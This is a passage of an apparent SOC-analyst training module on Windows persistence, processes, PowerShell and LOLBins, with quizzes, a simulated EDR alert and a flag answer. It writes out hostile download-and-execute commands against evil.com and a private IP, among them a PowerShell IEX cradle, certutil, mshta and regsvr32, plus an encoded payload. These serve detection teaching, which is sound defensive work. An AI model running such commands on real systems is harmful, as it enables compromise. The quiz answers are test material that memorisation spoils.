The most common place malware establishes **persistence** (the ability to survive a reboot) is the Registry **Run keys**. Any executable listed here is automatically launched every time Windows starts.

**The four main Run key locations:**

1. HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run — Applies to ALL users, requires admin to write
2. HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run — Applies to current user only, writable by standard user
3. HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce — Runs once then deletes the entry
4. HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce — Same but per-user

**What a legitimate Run key entry looks like:**

  Name: OneDrive
  Data: "C:\\Program Files\\Microsoft OneDrive\\OneDrive.exe" /background

**What a malicious Run key entry might look like:**

  Name: WindowsUpdater
  Data: C:\\Users\\victim\\AppData\\Roaming\\svch0st.exe

Notice: the legitimate entry has a descriptive name and a path in Program Files. The malicious entry has a misleading name ("WindowsUpdater") and points to %APPDATA% — a user-writable directory.

**Other important persistence Registry locations:**
- HKLM\\SYSTEM\\CurrentControlSet\\Services — Services registered here start automatically with Windows (more on services below)
- HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon — "Userinit" and "Shell" values control what runs during logon — frequently abused
- HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders — User-specific startup locations

**Windows Services: Persistent Background Processes**

**Services** are programs that run in the background, typically starting automatically when Windows boots, without requiring a user to be logged in. They're how Windows implements server functionality — web servers, database engines, antivirus engines, and the Windows Update service are all services.

View services by pressing Win+R and typing "services.msc", or by running "sc query" in a command prompt.

Each service has:
- **Name:** A short identifier (e.g., "Spooler" for Print Spooler)
- **Display Name:** A human-readable name ("Print Spooler")
- **Status:** Running, Stopped, or Paused
- **Startup Type:** Automatic, Automatic (Delayed), Manual, or Disabled
- **Log On As:** The user account the service runs under (LocalSystem, NetworkService, LocalService, or a specific user account)

**How malware abuses services:**
1. Creates a new service pointing to its malicious executable
2. Names the service to look like a legitimate Windows service (e.g., "WindowsDefenderService" or "GoogleChromeUpdate")
3. Sets it to start automatically
4. Can run as SYSTEM for maximum privilege

**Command to investigate services:** "sc query state= all" (PowerShell: Get-Service)

**Investigating suspicious services:** Look for services with:
- Unusual names or descriptions
- Running from %TEMP%, %APPDATA%, or other non-standard locations
- No description (legitimate services almost always have descriptions)
- Recently created (creation timestamp is important)`,
      },
      {
        type: "reading" as const,
        id: "win-fund-r3",
        heading: "Processes, PowerShell, LOLBins, and Attacker Techniques",
        content: `**Windows Processes: What's Running on Your System**

A **process** is a running instance of an executable program. When you open Chrome, Windows creates a process for it. When malware runs, it also creates a process (or injects into an existing one).

Every process has:
- **PID (Process Identifier):** A unique number assigned when the process starts (e.g., PID 4 is always the SYSTEM process)
- **Parent PID (PPID):** The PID of the process that created this process
- **Image path:** The full path to the executable file
- **Command line:** The exact command that was used to start the process
- **User context:** Which user account the process runs under
- **Creation time:** When the process was started

**Why parent-child relationships matter:**

In Windows, processes spawn other processes. When you click a Word document, Word.exe starts. If Word needs to run a macro, it might spawn cmd.exe. This creates a **process tree** — a hierarchy of parent and child processes.

**Suspicious parent-child relationships** are one of the most reliable indicators of compromise:

- **winword.exe → cmd.exe** — Word spawning a command prompt is a classic sign of malicious Office macro execution
- **excel.exe → powershell.exe** — Excel spawning PowerShell is extremely suspicious
- **svchost.exe → cmd.exe** — A service host spawning a shell
- **iexplore.exe → mshta.exe → wscript.exe** — A multi-stage attack chain
- **mshta.exe spawning anything** — mshta is a LOLBin frequently abused

Legitimate processes rarely spawn command shells. When you see them doing so, investigate.

**Critical legitimate Windows processes to know:**

- **System (PID 4):** The kernel itself
- **smss.exe:** Session Manager — starts other core processes during boot
- **csrss.exe:** Client/Server Runtime Subsystem — critical Windows process. Should always be running from System32. If you see csrss.exe from another location, it's fake.
- **winlogon.exe:** Handles login/logout, Ctrl+Alt+Del. Should only run from System32.
- **lsass.exe:** Local Security Authority Subsystem Service — validates logins, generates security tokens, stores credentials in memory. This is the target of **Mimikatz** (a credential-dumping tool). Any process accessing lsass.exe memory is a critical alert. Should only run from System32, only one instance, runs as SYSTEM.
- **svchost.exe:** Service Host — runs Windows services grouped together. Multiple legitimate instances are normal. Verify that all svchost.exe instances come from System32 and are running under SYSTEM, NetworkService, or LocalService — not a user account.
- **explorer.exe:** Windows Explorer (the desktop). Should only have one instance and come from System32.

**PowerShell: The Attacker's Favorite Tool**

**PowerShell** is Microsoft's powerful command-line shell and scripting language, built into every modern Windows system. It's essential for system administration — and equally essential for attackers.

**Why attackers love PowerShell:**
1. **Pre-installed:** Available on every modern Windows system — no need to drop tools
2. **Trusted:** Windows trusts PowerShell; it won't trigger antivirus on its own
3. **Powerful:** Can download files, enumerate the system, access the network, modify the registry, manage services, run .NET code, and much more
4. **In-memory execution:** Scripts can run entirely in memory without writing files to disk (called **fileless malware**)
5. **Obfuscation:** PowerShell commands can be heavily obfuscated to evade detection

**Suspicious PowerShell indicators to watch for:**

**Encoded commands (-EncodedCommand or -enc):**

  powershell.exe -EncodedCommand SQBFAFgAIAAo...

Base64 encoding is used to hide the actual command content. Attackers use this to obfuscate what their PowerShell command actually does.

**Execution policy bypass:**

  powershell.exe -ExecutionPolicy Bypass -File malware.ps1

PowerShell has execution policies to control script running. Attackers bypass them.

**Downloading and executing:**

  powershell.exe -c "IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')"

IEX (Invoke-Expression) executes a string as code. This downloads a script from the internet and runs it in memory — no file written to disk.

**LOLBins: Living Off the Land Binaries**

**LOLBins** (Living Off the Land Binaries) are legitimate Windows executables that attackers abuse to perform malicious actions while appearing to use built-in tools. Because these are signed Microsoft binaries, many security tools trust them.

**Key LOLBins every SOC analyst must know:**

- **certutil.exe:** Legitimate use — certificate management. Attacker use — download files (certutil -urlcache -f http://evil.com/payload.exe), encode/decode Base64
- **mshta.exe:** Runs HTA (HTML Application) files. Attackers use it to execute malicious HTML/JScript/VBScript (mshta http://evil.com/payload.hta)
- **rundll32.exe:** Loads and runs DLL files. Legitimate use — Windows internal. Attacker use — execute malicious DLLs, call COM objects
- **regsvr32.exe:** Registers COM DLLs. Attacker use (Squiblydoo technique): regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll — downloads and executes remote script
- **wscript.exe / cscript.exe:** Runs VBScript and JScript files. Frequently used to run malicious scripts delivered via email
- **bitsadmin.exe:** Windows BITS service management. Attacker use — download files using BITS (which may bypass proxies)
- **msiexec.exe:** Installs MSI packages. Attacker use — install malicious packages, load DLLs
- **wmic.exe:** Windows Management Instrumentation command line. Extremely powerful — can query system information, execute commands, move laterally
- **forfiles.exe:** Batch processing tool. Attacker use — execute commands indirectly to evade monitoring

**Windows Defender: The Built-In AV**

Every modern Windows system includes **Windows Defender Antivirus** (now called **Microsoft Defender Antivirus**). It provides:
- **Real-time protection:** Scans files as they're created or accessed
- **Cloud-delivered protection:** Submits suspicious files to Microsoft for cloud analysis
- **Controlled Folder Access:** Prevents unauthorized apps from modifying protected folders (ransomware defense)
- **Attack Surface Reduction (ASR) rules:** Block specific behaviors like Office macros spawning child processes

For SOC analysts: Windows Defender generates security event logs (Event ID 1116 = malware detected, 1117 = action taken). These feed into SIEM solutions and should be monitored. Attackers frequently attempt to disable Defender before deploying ransomware.`,
      },
      {
        type: "question" as const,
        id: "win-fund-q1",
        question:
          "A SOC analyst notices that lsass.exe is running from C:\\Users\\attacker\\AppData\\Temp\\lsass.exe instead of C:\\Windows\\System32\\lsass.exe. What does this most likely indicate?",
        options: [
          "This is normal — Windows sometimes runs system processes from user directories for performance",
          "This is a fake lsass.exe process — likely malware disguising itself as the legitimate Windows authentication process. The real lsass.exe always runs from System32",
          "The user has moved lsass.exe to a new location as part of a system optimization",
          "This indicates a Windows Update is in progress, temporarily relocating system files",
        ],
        answer: 1,
        explanation:
          "The real lsass.exe (Local Security Authority Subsystem Service) always runs from C:\\Windows\\System32\\lsass.exe, always runs as SYSTEM, and there should only be one instance. Finding lsass.exe anywhere else — especially in user-writable directories like %APPDATA% or %TEMP% — is a major red flag indicating malware attempting to blend in with legitimate processes. This is called 'process masquerading.' Attackers target lsass.exe specifically because it stores credential data in memory, making it the target of credential-dumping tools like Mimikatz.",
        xp: 15,
      },
      {
        type: "question" as const,
        id: "win-fund-q2",
        question:
          "An attacker wants to maintain persistent access to a compromised Windows machine without requiring admin privileges. Which Registry location can they write to without elevation?",
        options: [
          "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run — requires admin, applies to all users",
          "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run — writable by any user, auto-starts programs when that user logs in",
          "HKLM\\SYSTEM\\CurrentControlSet\\Services — requires admin, used for Windows services",
          "HKLM\\SOFTWARE\\Policies — requires admin, contains Group Policy settings",
        ],
        answer: 1,
        explanation:
          "HKCU (HKEY_CURRENT_USER) is writable by the currently logged-in user without requiring administrator privileges. The HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run key causes programs listed there to automatically start every time that user logs in. This makes it a favorite persistence mechanism for user-privilege malware. The HKLM (HKEY_LOCAL_MACHINE) equivalent requires admin rights. When auditing for persistence, always check both HKCU and HKLM Run keys for all users.",
        xp: 15,
      },
      {
        type: "log_analysis" as const,
        id: "win-fund-la1",
        heading: "Suspicious PowerShell Execution — Encoded Command Alert",
        context:
          "Windows Defender for Endpoint (MDE / Microsoft Defender for Endpoint) has flagged a suspicious process creation event on a workstation. The alert was triggered by PowerShell executing an encoded command shortly after a user opened an email attachment (a .docx file). The parent process (winword.exe — Microsoft Word) spawning PowerShell is highly suspicious.",
        event: {
          id: "evt-ps-001",
          ts: "2025-11-20T10:14:22Z",
          source: "edr" as const,
          event_type: "process_create" as const,
          severity: "critical" as const,
          hostname: "CORP-WS-0203",
          user_email: "jdoe@company.com",
          description:
            "Microsoft Word spawned PowerShell with Base64-encoded command — likely malicious Office macro executing payload",
          mitre_technique: "T1059.001 - Command and Scripting Interpreter: PowerShell",
          process: {
            name: "powershell.exe",
            pid: 6712,
            cmdline:
              "powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEAMAAuADUAMAAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA",
          },
          raw: {
            "mde.event_type": "ProcessCreated",
            "process.name": "powershell.exe",
            "process.path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "process.pid": 6712,
            "process.parent.name": "winword.exe",
            "process.parent.path": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
            "process.parent.pid": 4892,
            "process.command_line":
              "powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEAMAAuADUAMAAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA",
            "process.command_line_decoded":
              "IEX (New-Object Net.WebClient).DownloadString('http://192.168.10.50/payload.ps1')",
            "user.name": "CORP\\jdoe",
            "host.name": "CORP-WS-0203",
            timestamp: "2025-11-20T10:14:22Z",
          },
        },
        questions: [
          {
            question:
              "The parent process is winword.exe and the child process is powershell.exe. Why is this parent-child relationship suspicious?",
            options: [
              "Microsoft Word requires PowerShell to run — this is a normal and expected process tree",
              "PowerShell should always be started by the System process, never by user applications",
              "Microsoft Word (a document editor) spawning PowerShell (a powerful scripting engine) strongly suggests a malicious macro inside the Word document executed a command — a common initial access technique for malware delivered via phishing emails",
              "This only becomes suspicious if PowerShell then spawns another process — a single level of nesting is acceptable",
            ],
            answer: 2,
            explanation:
              "winword.exe → powershell.exe is one of the most well-known malicious process relationships in Windows security. Legitimate Microsoft Word does not need to spawn PowerShell under normal operation. This strongly indicates a malicious macro embedded in the Word document ran when the user opened the file (or enabled macros). The macro then invoked PowerShell to download and execute additional malware. This is the 'phishing → malicious document → macro → PowerShell → payload download' attack chain, responsible for a massive proportion of malware infections.",
            xp: 20,
          },
          {
            question:
              "The decoded_command field shows: 'IEX (New-Object Net.WebClient).DownloadString('http://192.168.10.50/payload.ps1')'. What is this command doing?",
            options: [
              "Checking Windows Update servers for available patches",
              "Running a diagnostic script that Microsoft pre-installs on all Windows systems",
              "Downloading a PowerShell script from an internal server (192.168.10.50) and immediately executing it in memory using IEX (Invoke-Expression) — a fileless execution technique that avoids writing the payload to disk",
              "Connecting to Microsoft's cloud to validate the Office license",
            ],
            answer: 2,
            explanation:
              "This is a classic PowerShell cradle (download-and-execute one-liner). Breaking it down: 'New-Object Net.WebClient' creates an object that can make web requests; '.DownloadString(URL)' downloads the content of the URL as a string (not as a file — it stays in memory); 'IEX' (Invoke-Expression) executes that string as PowerShell code. The entire payload runs in memory without being written to disk, making it 'fileless.' 192.168.10.50 is a private IP — the attacker has already compromised or planted a server inside the network and is using it as a staging server.",
            xp: 20,
          },
        ],
      },
      {
        type: "flag" as const,
        id: "win-fund-f1",
        prompt:
          "In the PowerShell alert above, what is the name of the parent process that spawned the suspicious PowerShell? Enter only the executable name (e.g., 'notepad.exe').",
        answer: "winword.exe",
        hint: "Look at the process.parent.name field in the raw log data. It is the Microsoft Word executable.",
        xp: 25,
      },
      {
        type: "question" as const,
        id: "win-fund-q3",
        question:
          "A SOC analyst is investigating a Windows server. They notice a service called 'WindowsSecurityHelper' running from C:\\ProgramData\\wsh\\svchost.exe. What is suspicious about this?",
        options: [
          "Services should not have descriptive names — they should only use numbers",
          "The real svchost.exe lives in C:\\Windows\\System32\\, not in C:\\ProgramData\\. Running a file named svchost.exe from a non-standard location is a classic malware masquerading technique. C:\\ProgramData\\ is writable without admin rights on some configurations.",
          "Services are only allowed to run from the Windows directory — C:\\ProgramData\\ is not allowed",
          "The service name 'WindowsSecurityHelper' contains too many characters for a Windows service name",
        ],
        answer: 1,
        explanation:
          "This is process masquerading — malware naming itself 'svchost.exe' to blend in with the dozens of legitimate svchost.exe processes that Windows runs. The key tell is the path: legitimate svchost.exe ALWAYS runs from C:\\Windows\\System32\\svchost.exe. Any svchost.exe running from another location (C:\\ProgramData\\, C:\\Temp\\, C:\\Users\\, etc.) is almost certainly malware. This is why analysts must always check both the process name AND the full path. Additionally, C:\\ProgramData\\ is world-writable on default Windows installations, making it an attacker favorite for dropping malware.",
        xp: 15,
      },
    ],
  },
];

export default rooms;
